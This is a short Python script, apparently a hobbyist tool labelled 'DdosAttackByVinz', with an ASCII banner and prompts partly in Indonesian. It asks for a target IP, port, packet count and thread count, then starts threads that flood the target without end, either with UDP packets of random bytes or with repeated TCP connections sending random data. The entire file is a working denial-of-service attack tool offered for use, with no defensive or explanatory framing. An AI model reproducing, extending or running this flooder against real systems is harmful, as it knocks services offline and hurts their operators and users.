import random

import socket

import threading

import os



os.system("clear")

print('''\033[94m

████████╗░░░██████╗░███████╗██╗░░██╗
╚══██╔══╝░░░██╔══██╗██╔════╝╚██╗██╔╝
░░░██║░░░░░░██████╔╝█████╗░░░╚███╔╝░
░░░██║░░░░░░██╔══██╗██╔══╝░░░██╔██╗░
░░░██║░░░██╗██║░░██║███████╗██╔╝╚██╗
░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

''')

ip = str(input("DdosAttackByVinz |IP  :"))

port = int(input("DdosAttackByVinz |Port  :"))

choice = str(input("Gas Gak? (y/n) >>>:"))

times = int(input("DdosAttackByVinz |Packet  :"))

threads = int(input("DdosAttackByVinz |Threads  :"))

def run():

    data = random._urandom(1159)

    i = random.choice(("[𝒙]","[𝒙]","[𝒙]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            addr = (str(ip),int(port))

            for x in range(times):

                s.sendto(data,addr)

            print("Mulai Mengirim Packet Ke Target")

        except:

            print("[!] SERVER HAS BEEN MAINTENANCE!!!")



def run2():

    data = random._urandom(16)

    i = random.choice(("[𝒙]","[𝒙]","[𝒙]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +" Vinz nih bos!!!")

        except:

            s.close()

            print("[!] SERVER HAS BEEN MAINTENANCE!!!")



for y in range(threads):

    if choice == 'y':

        th = threading.Thread(target = run)

        th.start()

    else:

        th = threading.Thread(target = run2)

        th.start()
